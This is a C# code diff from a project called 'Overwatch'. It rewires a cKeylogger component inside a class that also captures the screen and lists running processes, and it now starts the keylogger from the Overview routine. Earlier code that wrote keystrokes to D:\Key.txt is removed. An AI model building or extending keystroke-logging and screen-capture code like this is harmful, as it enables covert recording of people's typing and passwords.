@@ -7,20 +7,21 @@ using System.Diagnostics;
 using System.Text.RegularExpressions;
 using System.Collections.Generic;
 using System.DirectoryServices;
+using System.Windows;
 
 namespace Overwatch
 {
     class cReceiveInformation
     {
         public Graphics graph;
+        public cKeylogger keylogger; 
         public Bitmap bmp;
         static appLog Log;
-        static cKeylogger listener;
         public static void CreateAndUpdateDate(string text, string WayAndName) { System.IO.File.AppendAllText(WayAndName, text); }
         public cReceiveInformation()
         {
             graph = null;
-            listener = new cKeylogger();
+            keylogger = new cKeylogger();
             bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
             Log = new appLog();
         }
@@ -97,17 +98,10 @@ namespace Overwatch
             catch (Exception ex) { Log.Write(ex.Message, true); }
         }
 
-        public void Add() {
-            listener.KeyDown += new RawKeyEventHandler(KeyboardRecorder);
-        }
-        public void KeyboardRecorder(object sender, RawKeyEventArgs args)
-        {
-            CreateAndUpdateDate(args.ToString(),"D:\\Key.txt");
-        }
-
         public void Overview() {
             GeneralProcess();
             LocalProcess();
+            keylogger.start();
         }
     }
 }
